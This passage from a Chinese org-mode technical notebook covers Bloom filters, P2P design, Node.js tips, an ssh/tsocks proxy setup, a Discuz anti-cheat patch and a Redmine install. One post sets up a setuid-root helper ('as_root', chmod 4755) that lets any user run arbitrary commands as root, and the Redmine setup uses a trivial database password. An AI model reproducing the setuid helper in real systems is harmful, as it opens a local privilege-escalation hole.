      - 节省空间 :: 每个元素只需要一个位来存储。

*** BloomFilter
    
    - 参考 :: [[http://zh.wikipedia.org/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8][布隆过滤器 - 维基百科]]、[[http://en.wikipedia.org/wiki/Bloom_filter][Bloom filter - Wikipedia]]
    
    
    - 原理
      类似于位图，只不过每个元素由n个哈希函数来映射到n个位，元素映射的所有位都为1方表示元素存在。
      
    - 特点

      - 有误差 :: 比起Bitmap误差率可以很好的控制（除了通过选择更好的哈希函数，还可以通过增加更多的哈希函数以及相应的哈希空间来减少误差率）
      - 节省空间 :: 每个元素只需要n个位来存储，n可自定。

** TODO p2p系统构建                                                     :p2p:

*** 结点间的连通
    
    - 双方外网 :: 直连
    
    - 一内一外 :: 直连／反连
      - 中间服务器 :: 发送被反连方指令给反连方，所有内网服务器都需要在中间服务器上保持一个连接，以接收控制指令。

    - 双方内网 :: 穿透
      
      - 使用UDP进行NAT穿透
        
        - 穿透服务器 :: 为穿透双方服务的外网服务器

*** 结点网
    
    - 结点标识符 :: 硬件标识（mac地址）或用户id
    - 所有结点启动时加入到网络中，并发送心跳，结点主动关闭或通过心跳检测出已下线时退出网络。
    - 需要记录结点以下信息
      - 类型 :: 外网、可穿透内网、封闭内网
      - 负载 :: 上传能力

    这就是状态服务器，状态服务器需在结点状态变化时同步结点状态信息到资源服务器

*** 资源网

    所有结点拥有的资源需要在资源服务器上呈现。

    - 资源标识符 :: 如文件内容的sha1
    - 资源组织，满足以下需求：
      - 根据资源id查找拥有该资源的一批活跃结点，支持各种查找条件（按：同运营商、随机取、按地理位置）
      - 更新结点id拥有的资源
      
      #+begin_src artist
        +-------------------+
        | p2p://example.com |
        +---------+---------+
                  |            +------------------------------------------+
                  +------------+ 1111111111111111111111111111111111111111 |
                  |            +----------------------+-------------------+
                  |                                   |   +-------+
                  |                                   +---+ user1 |
                  |                                   |   +-------+
                  |                                   |           
                  |                                   |   +-------+
                  |                                   +---+ user2 |
                  |                                   |   +-------+
                  |                                   |           
      #+end_src

*** 实施
    |------------+--------------------------------------------------------------------+--------|
    | 组件       | 功能                                                               | 人／月 |
    |------------+--------------------------------------------------------------------+--------|
    | 穿透服务器 | 协助客户端进行穿透的外网服务器                                     | 2/0.5  |
    |------------+--------------------------------------------------------------------+--------|
    | 状态服务器 | 与所有客户端保持连接，记录客户端的上下线状态及属性、转发反连指令   | 3/1    |
    |------------+--------------------------------------------------------------------+--------|
    | 资源服务器 | 索引所有资源，根据各种策略为客户端查找拥有该资源的其它客户端信息， | 5/3    |
    |            | 客户端存储的资源变动时，更新资源对应的客户端列表                   |        |
    |------------+--------------------------------------------------------------------+--------|

*** 协议
    #+begin_src ditaa :file ../static/p2p_protocol.png :cmdline -r -S -s 3

















    #+end_src
** DONE 《理解Node.js》培训课件                                     :node:
   CLOSED: [2013-07-04 四 18:31]
   
   本课件介绍Node.js的特点及其初步使用。

*** 开发计划 [1/3]
    - [X] 编写大纲
    - [ ] 编写内容
    - [ ] 制作Microsoft PowerPoint格式文档

*** 在线演示
    [[http://blog.kankanan.com/slides/理解Node.js.html][《理解Node.js》]]

** DONE Archlinux下解决更新grub后无法进入gnome3桌面的问题         :archlinux:
   CLOSED: [2013-06-26 Wed 10:07]
   
   在启动界面上会看到以下错误日志：
   #+begin_example
   kernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!
   #+end_example

   这个是由于grub配置文件中指定了内核参数 =nomodeset= 导致，linux的默认配置是为了运行服务器，以减少启动过程中出错的可能性，使用gnome3桌面时，需去掉内核参数 =nomodeset= ，以下为[[https://wiki.archlinux.org/index.php/ATI#Disable_KMS][原文]]：

   #+begin_example
     Note: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.
   #+end_example

** DONE linux下翻墙访问bitbucket.org仓库                    :linux:hg:bitbucket:
   CLOSED: [2013-06-28 Fri 13:57]
   
   今天往bitbucket.org push时才发现bitbucket被GFW了。我的仓库为Mercurial hg，hg项目根目录下的 =.hg/hgrc= 配置文件中可指定http\_proxy，试了一下不支持socks代理（我的浏览器用它来翻墙），最终使用tsocks软件实现翻墙访问bitbucket.org仓库。

   - 利用vps建本地socks代理的脚本 =ssh_proxy.sh=
     #+begin_src sh
       #!/bin/bash
       
       n=`ps waux | grep 'bash .*/ssh_proxy.sh' | grep -v grep | wc -l`
       if [ $n -lt 3 ]; then
           while [ true ]; do
               n=`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`
               if [ $n -lt 1 ]; then
                   echo "start ssh connecting"
                   ssh -qTnNf -D 7070 user@host
               fi
               echo "wait for next checking"
               sleep 30
           done
       fi
       echo "ssh_proxy.sh already running"
       
     #+end_src

     请将user@host改为你的vps用户及主机，并配置为免输入密码。

   - 启动socks代理脚本
     
     #+begin_src sh
       nohup bash ./ssh_proxy.sh &
     #+end_src

     浏览器也可以利用它来翻墙。

   - 安装tsocks
     #+begin_src sh
       yaourt -S tsocks
     #+end_src

   - 配置tsocks

     =/etc/tsocks.conf=
     #+begin_example
       # We can access 192.168.0.* directly
       local = 192.168.0.0/255.255.255.0
       local = 10.0.0.0/255.0.0.0
       
       # Otherwise we use the server
       server = 127.0.0.1
       server_port = 7070
     #+end_example
     具体用法 =man tsocks.conf=

   - 使用tsocks让hg用上socks代理功能
     #+begin_src sh
       tsocks hg push
     #+end_src
     tsocks看起来很通用，应该也可以让git等进行socks代理访问。

** TODO 《架构风格与基于网络的软件架构设计》读书笔记           :REST:reading:
   
   #+begin_quote
   架构设计的目标是创建一个包含一组架构属性的架构，这些架构属性形成了系统需求的一个超集。不同架构属性的相对重要性取决于想要得到的系统本身的特性。
   #+end_quote

   我们对架构的学习和使用应该更明智一些，通过学习能够做到对一种架构的相关特性（包括优点及缺点）了然于胸，同时在使用的时候能够摆脱潮流及个人主观喜好的影响，选择正确的架构，这样才能获得架构所带来的质量保证，我们才能够对在此基础上构建的系统充满信心。

   
   #+begin_quote
   一种架构风格是一组协作的架构约束，这些约束限制了架构元素的角色和功能，以及在任何一个遵循该风格的架构中允许存在的元素之间的关系。
   #+end_quote

   #+begin_quote
   一个好的设计师应该选择一种与正在解决的特定问题最为匹配的风格。为一个基于网络的应用选择正确的架构风格必须要理解该问题领域，因此需要了解应用的通信需求，知道不同的架构风格和它们所导致的特殊问题，并且有能力根据基于网络的通信的特性来预测每种交互风格的敏感度。
   #+end_quote

** TODO 理解REST [0/3]                                                 :REST:

   - [ ] REST介绍

     REST（Representational State Transfer，表述性状态转移）, 是一种针对网络应用的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。
     
     REST 指的是一组架构约束条件和原则，满足这些约束条件和原则的应用程序或设计就是RESTful。RESTful的Web应用可以获得接口统一、结构优良以及充分使用HTTP协议的好处。

     REST 是Web的架构风格，HTTP 1.1规范的指导原理。

     #+begin_src ditaa :file ./rest_arch.png :cmdline -S -E -s 1.5
               +------------+
               | cBLU       |
               | Hypermedia |         --=--> 三级：超媒体做为应用状态的引擎
               |            |
           +---+------------+---+
           | c0FF               |
           |        HTTP        |     --=--> 二级：使用多个HTTP方法来操作（CRUD）资源
           |                    |
       +---+--------------------+---+
       |  cGRE                      |
       |            URI             | --=--> 一级：使用很多URI暴露很多资源 
       |                            |
       +----------------------------+
       
                                   
                                WEB服务成熟度模型
     #+end_src

     资源由URI标识，资源与URI为一对多关系。

     对资源的操作由HTTP方法对应（Create(POST)、Update(PUT)、Read(GET)、Delete(DELETE)）。
     
     客户端与服务器通过交换资源表述驱动应用状态变迁。

   
   - [ ] REST实现

     REST
     
   - [ ] REST应用

** TODO 实现RESTful Web服务                                            :REST:

*** 环节

    - 找出资源
    - 找出服务接口

** DONE 使用番茄工作法的感受                                       :pomodoro:
   CLOSED: [2013-07-08 一 13:10]

*** 基本要领
    
    从事务清单中选出今天要做的事

    按优先级填入今日工作计划表

    从表中选择第一项未完成事务按下计时器

    专心做这件事

    25钟后铃响立即停止做事

    在当前事务后标记用掉了一个番茄

    事务完成则在今日事务清单划掉当前任务

    专心休息地5分钟（每4个周期长休息15-30分钟）

    按下计时器

    继续做事

    如此往复

*** 掌控干扰因素

    - 做事时如遇实发事件酌情处理：

      - 添加到事务清单中明天再处理
      - 直接安排到今日事务清单稍后处理
      - 立即取消当前事务开始处理突发事件

    - 在当前事务后方打个中断标记

*** 解读工作记录

    一天结束后我们将获得以下信息：

      - 知道处理某个事务用时多少。怎样让时间用得更少？

      - 知道时间花在哪里去了。能否将时间更多花在有效处理工作上？

    当新的一天开始时，我们会清楚地知道每天有多少个番茄可用，今天可以安排多少事务，每个事务需要消耗多少个番茄。

    随着我们不断地根据这些记录改进我们的工作效率，最终我们能够安排时间、掌控时间。

*** 番茄工作法遵从习惯法则

    当我跟老婆解释番茄工作法时，她说了句：“这个和你之前说的习惯法则很像”，细细一想不无道理。

    习惯的形成的三个步骤：暗示、惯常行为、奖赏。以及习惯回路。

    番茄工作法也有这三个要素：

    　　暗示　　　　　　按下计时器

    　　惯常行为　　　　处理事务

    　　奖赏　　　　　　清脆的铃响、标记番茄的成就感、休息时间的放松

    而习惯回路的形成也容易发现，每天一早来到公司，谁不渴望今天能够过得充满成就感、休息时能够毫无顾忌呢。

    遵从习惯法则的方法论才会更容易展开并长久地坚持下去。

*** 参考资料
    [[http://www.pomodorotechnique.com/download/pdf/ThePomodoroTechnique-CHN_v1-3.pdf][《番茄工作法》]]
    [[http://baike.baidu.com/view/5259318.htm][番茄工作法_百度百科]]
    [[http://pomodoro.kankanan.com][番茄工作法在线服务]]

** TODO 番茄园                                                     :pomodoro:
   
   番茄园是一个在线的番茄工作法实施环境。

*** 用例
    
    - 添加任务
    
    - 开启番茄钟

    - 取消番茄钟
 
    - 任务上记录完成的番茄数
     
    - 任务上记录中断的番茄数

*** 模型

    #+Caption: 用户
    |-------------------------+------------|
    | 字段                    | 意义       |
    |-------------------------+------------|
    | id                      | 用户标识符 |
    | profile.provider        | 身份提供者 |
    | profile.identifier      | 身份标识符 |
    | profile.name            | 用户名称   |
    | profile.email           | 用户邮箱   |
    | preferences.tick.volume | 嘀嗒声音量 |
    |-------------------------+------------|

    #+Caption: 任务
    |-----------+--------------------|
    | 字段      | 意义               |
    |-----------+--------------------|
    | id        | 任务标识符         |
    | name      | 名称               |
    | priority  | 优先级             |
    | pomodoros | 关联的番茄标识列表 |
    | user      | 所属用户           |
    |-----------+--------------------|

    #+Caption: 番茄
    |--------+------------|
    | 字段   | 意义       |
    |--------+------------|
    | id     | 番茄标识符 |
    | begin  | 起始时间   |
    | end    | 结束时间   |
    | length | 持续时长   |
    | task   | 所属的任务 |
    |--------+------------|

    #+Caption: 日程
    |--------+----------|
    | 字段   | 意义     |
    |--------+----------|
    | id     | 事件标识符 |
    | start  | 起始时间 |
    | end    | 结束时间 |
    | allDay | 是否全天 |
    | title  | 事件名称   |
    | user   | 所属用户 |
    |--------+----------|

    - 番茄状态
      
      已完成：结束时间 - 起始时间 >= 持续时间
      已取消：结束时间 - 起始时间 < 持续时间
      进行中：其它

*** 界面

    #+begin_src ditaa :file ../static/pomodoro_ui.png :cmdline -r -S -s 3
      +---------------------------------------------------------------------+
      |                   +-------+                                         | 
      |                   | timer | stop                                    | 
      |                   +-------+                                         | 
      |                                                                     | 
      |        +------------------------------+                             | 
      |        |                              | add                         | 
      |        +------------------------------+                             | 
      |                                                                     | 
      |        +------------------------------------+                       | 
      |        |   task 1             xxx           | delete start up down  | 
      |        +------------------------------------+                       | 
      |        |   task 2             xx            | delete start up down  | 
      |        +------------------------------------+                       | 
      |        |   task 3                           | delete start up down  | 
      |        +------------------------------------+                       | 
      |        |               ...                  |                       | 
      |        +------------------------------------+                       | 
      +---------------------------------------------------------------------+
    #+end_src

*** URL接口
    
    工作：/users/:user_id/works/:work_date/
    任务：                                 tasks/:task_id/
    番茄：                                                pomodoros/:pomodoro_id

** TODO 图解linux启动过程                                             :linux:

   #+begin_src ditaa :file ../static/linux_boot.png :cmdline -r -S -s 3
     +------------+
     |  power on  |
     +------------+
           
             +-----------+
             | load bios |
             +-----------+
                                                               
                                                                                                 
                                                               
                       boot device
                                
                             MBR 
                                
                                PRE-BOOT    PARTITION TABLE
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
   #+end_src

** TODO git-svn搭配sshfs实现远程代码编辑及代码管理            :git:svn:linux:

   公司使用内网中统一的svn服务器进行集中式的代码管理，项目的测试环境布署在内网中的虚拟机集群上。

   因为测试环境上的代码树是由多个开发人员同时访问的，因此布署的是从svn中export出来的代码。有的人通过“本地修改副本->上传副本到测试机->测试通过->提交本地副本”方式工作，有的人通过“直接远程修改测试机代码->测试通过->拉回本地->提交代码”。无论是哪种方式都有代码覆盖的风险、以及遗漏提交代码的风险。

   

*** 解决的问题   

** DONE node.js下访问mysql注意事项                            :node:mysql:
   CLOSED: [2013-10-11 五 10:45]
   
   本文仅针对 [[https://github.com/felixge/node-mysql][node-mysql]] 模块。

   - Connection 对象为一个到mysql的连接，在其上的query是串行进行的。

     由于mysql协议类似http是串行的，在一个mysql连接上的多个query必须依次进行。
     
     [[https://github.com/felixge/node-mysql][node-mysql]] 的 Connection对象上同时发起的多个query会队列化，
     
     处理完一个query再进行下一query的处理，传递给回调函数的query结果不会错乱。

     在有一定访问量的服务中应该总是使用 =连接池= 。

     
   - 处理Connection对象的重连。

     mysql连接空闲一段时间后（默认8小时）会自动关闭，
   
     可以在Connection对象的 =error= 事件中检测后连接断开时进行重连。

     使用 =连接池= 不会有问题，连接断开后会默认从连接池中剔除。

** DONE 为什么不能在构造函数中调用shared_from_this                      :cpp:
   CLOSED: [2013-12-20 Fri 01:02]

   先看示例代码：

   #+begin_src c++
     class Chicken : public enable_shared_from_this<Chicken>
     {
     public:
         Chicken()
         {
             shared_ptr<Chicken> chicken_ptr = shared_from_this();    //throw std::bad_weak_ptr
         }
     };
   #+end_src

   再看shared\_from\_this()的行为：
   #+begin_src c++
     return _weak_ptr->lock();
   #+end_src

   =_weak_ptr= 为父类（ =enable_shared_from_this= <Chicken>）的成员变量，需要一个 =shared_ptr= <Chicken>对象来初始化它，而 =shared_ptr= <Chicken>需要一个Chicken对象来创建，但此时Chicken对象正在构造中，这是个鸡与蛋的无解问题。
   
   其实 =_weak_ptr= 成员变量是在 =shared_ptr= 的构造函数中延迟初始化的，不只是在构造函数中不能调用 =shared_from_this= ，像下面的使用方式同样不行：
   #+begin_src c++
     Chicken* chicken = new Chicken();
     shared_ptr<Chicken> chicken_ptr = chicken->shared_from_this();  //throw std::bad_weak_ptr
   #+end_src
   
   =enable_shared_from_this= 不是从this祼指针变出智能指针的魔法，它只是一个辅助类，为一个只使用 =shared_ptr= 管理对象生命周期的类添加一个自身的智能指针成员变量供内部使用。

   而“不能在构造函数中调用 =shared_from_this= ”这个问题仅仅是标准实现上的一个漏洞。

   你应该像下面这样用：
   #+begin_src c++
     class Chicken : public enable_shared_from_this<Chicken>
     {
     public:
         Chicken()
         {
         }
     
         void use()
         {
             shared_ptr<Chicken> chicken_ptr = shared_from_this();
         }
     };
     
     shared_ptr<Chicken> chicken_ptr(new Chicken);
     chicken_ptr->use();
   #+end_src

   突然想起一段对话：
   #+begin_quote
   阿漆：闻西，事情进行的怎么样了，闻西？

   达闻西： 最近我发明了些东西，相信能帮得到你。

   达闻西拿出手电筒。

   阿漆：手电筒？

   达闻西：错，这支不是一只普通的手电筒，这支是一支不需要电池的太阳能手电筒，在有光的时候他就会亮。

   司令：那如果没有光呢？

   达闻西：绝对不亮。

   阿漆：有没有可能没光的时候它也会亮？

   达闻西：问的好，关灯。

   达闻西：你拿另一只手电筒照它呢，它就会亮。

   达闻西：哈哈，怎么样啊？

   阿漆：这个发明还真有创意啊。
   #+end_quote



   参考：《[[http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0][shared\_from\_this 几个值得注意的地方]]》

** DONE Discuz访问推广任务反作弊                                 :php:discuz:
   CLOSED: [2013-12-20 Fri 01:02]

   - 识别作弊

     发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。

     在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：

     #+begin_example
       mysql> SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;
       +-------+----------+-------------+
       | total | cyclenum | extcredits2 |
       +-------+----------+-------------+
       |  3454 |     3454 |           1 |
       +-------+----------+-------------+
       1 row in set (0.00 sec)
     #+end_example
     
     相关字段说明
       - total :: 策略被执行总次数
       - cyclenum :: 周期被执行次数 
       - extcredits2 :: 我们的系统里对应金钱数
       - rid :: 值8为访问推广任务类型
       - uid :: 值119为作弊用户id

     从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。
     
     搜索该用户推广链接在web服务器中留下的访问日志：
     #+begin_example
       logs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*
       "GET /?fromuid=119.jpg HTTP/1.1" 301 6243 "http://xxxx.org/details.php?id=178668"
       ...
     #+end_example

     可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。

   - 阻止作弊

     通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。

     修改source/class/discuz/discuz\_application.php文件，将下面的内容：
     #+begin_src php
       if((!empty($_GET['fromuid']) || !empty($_GET['fromuser'])) && ($this->var['setting']['creditspolicy']['promotion_visit'] || $this->var['setting']['creditspolicy']['promotion_register'])) {
           require_once libfile('misc/promotion', 'include');
       }
     #+end_src
     改为：
     #+begin_src php
       if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'http://XXX.com/') === 0) {
           $referer_query = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_QUERY);
           if ($referer_query) {
               parse_str($referer_query, $referer_get);
               if((!empty($referer_get['fromuid']) || !empty($referer_get['fromuser'])) && ($this->var['setting']['creditspolicy']['promotion_visit'] || $this->var['setting']['creditspolicy']['promotion_register'])) {
                   require_once libfile('misc/promotion', 'include');
               }
           }
       }
     #+end_src

     修改source/include/misc/misc\_promotion.php文件，将下面的内容：
     #+begin_src php
       if(!empty($_GET['fromuid'])) {
           $fromuid = intval($_GET['fromuid']);
           $fromuser = '';
       } else {
           $fromuser = $_GET['fromuser'];
           $fromuid = '';
       }
     #+end_src
     改为：
     #+begin_src php
       if(!empty($referer_get['fromuid'])) {
           $fromuid = intval($referer_get['fromuid']);
           $fromuser = '';
       } else {
           $fromuser = $referer_get['fromuser'];
           $fromuid = '';
       }
     #+end_src

** DONE linux下允许普通用户执行需要root权限的命令                   :linux:c:
   CLOSED: [2013-12-26 四 15:44]

   最典型的情况是要实现一个通过web界面重启系统的功能，通常为了安全会以非root用户身份（通常是nobody）运行服务端脚本，这样脚本中就不能执行危险操作了。

   下面的c工具程序可以允许任意用户执行需要root权限的命令：

#+o_blog_source ./static/as_root.c

   编译：
   #+begin_src sh
     gcc -g as_root.c -o as_root
   #+end_src

   配置：
   #+begin_src sh
     chown root:root ./as_root; chmod 4755 ./as_root
   #+end_src

   运行：
   #+begin_src sh
     sudo -u "nobody" ./as_root "reboot"
   #+end_src
   
   参考：[[http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&PostID=1629441][如何在普通用户下执行一些需要root用户执行的命令]]

** DONE express.js中如何在第一次请求的响应中取得connect.sid            :node:
   CLOSED: [2014-02-14 Fri 23:34]

   在web页面通过iframe跨域登录访问服务的情况下，是不方便取cookie中的sessionid的，于是想到将sessionid直接放到响应体中，
   这就需要在node.js中直接获取connect.sid这个cookie值，一开始想当然地以为系统（使用的是passport.js）会在登录认证通过后
   执行res.cookie('connect.sid', ...)进行设置，就想直接从res的Set-Cookie头解析出设置的值，结果发现这个cookie压根不存在，
   甚至在库代码中搜索cookie都不管用，着实急得人直抓头。最后dump出res后确在req中见到了connect.sid值的影子：req.sessionID，
   然后在 [[http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie][《Express SessionID differs from SessionID in Cookie》]] 中找到了从req.sessionID计算出connect.sid的方法：

   #+begin_src js
     var signature = require('express/node_modules/cookie-signature');
     var connectSid = 's:' + signature.sign(req.sessionID, sessionOptions.secret);
   #+end_src

   其实，connect.sid这个cookie是在请求到来后在req上设置的（不存在则设置），不管有没有登录都会设置。

** TODO 安装archlinux实录                                         :archlinux:

   - 机器型号

   - 首先按照 [[https://bbs.archlinuxcn.org/viewtopic.php?id=1037][这篇文章]] 进行安装

   - 因为是直接插网线的，启用网络服务
     
     #+begin_src sh
       systemctl enable dhcpcd.service
     #+end_src

   - 安装完成重启后出现“device not found”的错误，并提示指定uuid的分区不存在
     
     在archlinux启动项上按c进入命令行，记下/boot分区（这里是hda0,msdos1）的uuid，再次重启机器，在archlinux启动项上按e，将里面的uuid值替换为之前记下来的正确的uuid，
     按F10后应该可以正常启动了，使用root帐号登录后，再次执行“grub-mkconfig -o /boot/grub/grub.cfg”出现out of memory及其它错误（很可能在参考前一篇文章执行时就有这个错误，只是被忽视了），
     参考 [[https://bbs.archlinux.org/viewtopic.php?id=173921][这篇文章]] 在/etc/default/grub.cfg中追加下面一行内容：
     #+begin_example
     GRUB_DISABLE_SUBMENU=y
     #+end_example
     再次生成grub.cfg，就好了。
     
** DONE 编译安装node.js                                                :node:
   CLOSED: [2014-02-17 Mon 16:23]
   
   - 下载

     node.js是一个新兴的开发平台，版本更新非常活跃，因此应该尽量下载安装最新的版本。

     到 [[http://nodejs.org/]] 下载最新的版本。

   - 安装
   
     解压后参照 README.md 进行安装：

     #+begin_src sh
       ./configure
       make
       make install
     #+end_src
   
   - 安装后
     
     默认安装到/usr/local。

     + /usr/local/bin/node :: node主程序
     + /usr/local/bin/npm :: node模块管理程序
     + /usr/local/lib/node\_modules :: node全局模块目录

     像一些需要全局安装的模块也会把文件安装在/usr/local目录下。
     
** DONE 编译安装redis                                                 :redis:
   CLOSED: [2014-02-17 Mon 16:40]
   
   - 下载
     
     到 [[http://redis.io/download]] 下载最新稳定版本。

   - 安装
   
     解压后参照 README 进行安装：

     #+begin_src sh
       make
       make install
     #+end_src
   
   - 安装后
     
     默认安装到/usr/local。

     + /usr/local/bin/redis-cli :: redis客户端程序 
     + /usr/local/bin/redis-server :: redis服务器程序
** TODO 当心烦意乱接下来不知道要做什么的时候                           :心理健康:

   - 试着通过深呼吸、走一走、微笑让自已平静下来，回归理性的自已。
     
   - 使用待办事项记录，一定要细致到可以直接采取行动，不用等到有好心情才能做成一些事情。
** TODO 迅雷路由水晶版内测资格申请页面上线的故事                      :story:

   - 先看看注册页面的svn日志吧:)

     #+begin_example
       ------------------------------------------------------------------------
       r922 | tangxinfa | 2014-03-03 18:21:31 +0800 (Mon, 03 Mar 2014) | 4 lines
       
       修复discuz进行xss检查导致的用户申请丢失的bug。
       
       ------------------------------------------------------------------------
       r744 | tangxinfa | 2014-02-24 13:04:47 +0800 (Mon, 24 Feb 2014) | 3 lines
       
       申请表单去除”身份证号码“字段。
       ”市、县级市“改为非必填（在选“广东省”，“中山市”时出现）。
       
       ------------------------------------------------------------------------
       r740 | tangxinfa | 2014-02-22 19:36:03 +0800 (Sat, 22 Feb 2014) | 4 lines
       
       身份证号 手机号码 邮箱 QQ号码 申请理由不得重复.
       修复缓存导致的登录跳转死循环bug.
       图片引用绝对路径以支持正式环境上的url重写.
       
       ------------------------------------------------------------------------
       r721 | tangxinfa | 2014-02-22 16:24:12 +0800 (Sat, 22 Feb 2014) | 3 lines
       
       兼容ie6.
       修复缓存相关bug.
       
       ------------------------------------------------------------------------
       r704 | tangxinfa | 2014-02-22 00:02:59 +0800 (Sat, 22 Feb 2014) | 1 line
     #+end_example

   - r704 :: 周五晚上，刚过12点，哥哼着小曲，心满意足的提交了代码（再三要求不许再改设计图之后，终于调好了）。同事：very good，看来明天我可以不用来加班了，有事给我电话。
   
   - r721 r740 :: 上午快11点才到的公司，看来今天收收尾就就能早点回家了。

             + 打算就错误处理这一块进行了完善 :: 提交数据时检查下字段是否有重复值，有重复值还要给用户提示错误。
    
               懒得一个一个字段的地判断重复了，数据库结构一改：不能重复定义为UNIQUE就是了，插入记录出错时如果错误码表明因重复的字段值引起则从错误描述中匹配出字段名，
   
               然后返回给客户端进行提示即可。天衣无缝啊，几年前就想这么干了，总算得手了。


             + 同事反映了一个问题 :: ”市、县级市“中有重复项
   
               一查还真是有，网上找的东东问题多啊，直接给js地址库加了个检测重复值的方法，控制台打印出重复项的位置，好多重复的“城关镇”啊，删掉重复项，收工。

             + 有热心网友反馈ie6/ie7下的兼容性问题

               这个问题必须有，压根没想到要给页面做ie6/ie7兼容，哥没空啊，忙得都忘了还有用ie6/ie7的人了。不过思来想去还是得改啊，开门做生意哪能拒人于千里之外呢，更何况这网友能耐大着呢，看图：

               [[file:static/ie6bugfix1.png]]

               [[file:static/ie6bugfix2.png]]

               见过给我提意见的，没见过直接列出解决方案的，做前端肯定比我专业。

             + 在测试环境上跑了一遍上线，整理了一下要点，就叫它《20140224-水晶版内测上线指南》吧，等周一过来切下主页就完事了，晚上8点哼着小曲瘪着肚子回家。

   - r744 :: 早上9:20就到公司，10点准时上线申请页面。才半个小时就有1000多人注册，比我想像的多多了。

             + 同事反映有部分网友登记时不愿提供身份证号码，去掉这一项话更友好

               那就改吧。一条SQL语句“ALTER TABLE `XXXXXX` CHANGE `idnumber` `idnumber` char(32) NOT NULL DEFAULT ''”去掉必填限制，html表单中去掉该字段，测了一下没问题立即上线。

             + 5分钟后，论坛、微博有不少网友反映点提交按钮没反映，同事那里也重现了，原来改数据库字段定义时UNIQUE属性不会自动删除，Google了一下，再来一条SQL语句“ALTER TABLE `g_custom_open` DROP INDEX idnumber;”。

             + 有网友反映，收货地址选“广东省”，“中山市”后，”县级市“下拉空就空了，现在又必填才能提交

               修改html表单校验js，去掉必填限制。

   - r922 :: 同事给出了选中进行内测的用户id列表，结果在申请数据表中竟然没有申请记录，一开始怀疑是用户有多个迅雷帐号，可能使用的是其它帐号提交的申请，不过很快排除了这种可能，查了一下RTX记录，申请的用户数也一直正常在增长，
             
             于是在错误处理进行得更严格了一些，很快用户反映提交出错，在用户的协助下从服务器抓包后发现提交申请的响应竟然是一个html页面：您当前的访问请求当中含有非法字符，已经被系统拒绝。
             
             原来，discuz默认情况下会对用户的输入进行检查如果其中包含像"><'()这些符号则会认为是xss攻击，阻止提交。最终通过在这个请求中临时禁用xss检测，解决了这个问题。

             但是粗略估计有1/7的申请丢失，好在挑选内测用户是在论坛所有用户中选取后再获取他们的申请信息，不影响申请结果。

   - 结语

     + 再简单的页面也能养活一堆虫子

     + 一定要有专业的测试人员来把测试关

     + 群众的眼睛是雪亮的

     + 要使用严格的错误检测
** TODO 选择基于Web的项目管理工具                                  :web:tool:

   - [[http://collabtive.o-dyn.de/index.php][Collabtive]] 使用php开发，可自行安装。界面效果非常棒，中文界面。项目管理及帐号管理也很不错。但功能单一，只支持任务跟踪。

   - [[http://trac.edgewall.org/][Trac]] 使用python开发，可自行安装。界面一般，中文支持较差。项目管理及帐号管理很差。功能较丰富，支持Wiki、任务及Bug跟踪。

   - [[https://trello.com][trello]] 使用node.js开发，不可自行安装。界百效果超棒，不支持中文。项目管理及帐号管理很棒。功能单一，只支持任务跟踪，注重团队交流。

** DONE CentOS 6.4下安装redmine                               :linux:redmine:
   CLOSED: [2014-03-07 Fri 14:17]

   本文为CentOS 6.4下安装redmine-2.5.0的笔记，按照 [[http://www.redmine.org/projects/redmine/wiki/RedmineInstall][官方文档]] 进行安装。

*** 安装 =ruby=
     
    #+begin_src sh
      yum install ruby
      yum install ruby-devel
      yum install rubygems
    #+end_src

*** 安装 =redmine=
    
    #+begin_src sh
      wget 'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'
      tar xzvf redmine-2.5.0.tar.gz
      gem install bundler
      gem install mysql2.
      yum install ImageMagick ImageMagick-devel
      bundle install --without development test  
    #+end_src

*** 配置 =redmine=

    - 以 root 用户登录 =mysql=

      #+begin_src sh
        mysql -uroot -p
      #+end_src

    - 创建 =redmine= 用户及库

      #+begin_src sql
        CREATE DATABASE redmine CHARACTER SET utf8;
        CREATE USER 'redmine'@'localhost' IDENTIFIED BY 'redmine';
        GRANT ALL PRIVILEGES ON redmine.* TO 'redmine'@'localhost';
      #+end_src
    
    - 修改数据库配置文件

      #+begin_src sh
        cp config/database.yml.example config/database.yml
        diff config/database.yml config/database.yml.example
        10,11c10,11
        <   username: redmine
        <   password: "redmine"
        ---
        >   username: root
        >   password: ""
      #+end_src
    
    - 初始化会话存储
      
      #+begin_src sh
        rake generate_secret_token
      #+end_src
      
    - 创建数据库表结构
    
      #+begin_src sh
        RAILS_ENV=production rake db:migrate
      #+end_src

    - 解决上一步可能出现的错误

      #+BEGIN_QUOTE
        rake aborted!
        Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
        
        Tasks: TOP => db:migrate => environment
      #+END_QUOTE
      
      确定 =mysql= 启动时指定的 =mysql.sock= 文件的路径

      #+begin_src sh
        ps aux | grep mysql.sock
      #+end_src

      显示的 =mysql.sock= 路径可能为“ =--socket=/tmp/mysql.sock= ”

      修改 =redmine= 数据库配置，在 =production= 配置中添加 =socket= 项：

      #+begin_example
        production:
          ...
          socket: /tmp/mysql.sock
      #+end_example

      重新进行上一步操作。
       
    - 初始化数据

      #+begin_src sh
        RAILS_ENV=production REDMINE_LANG=zh rake redmine:load_default_data
      #+end_src

    - 创建相关目录

      #+begin_src sh
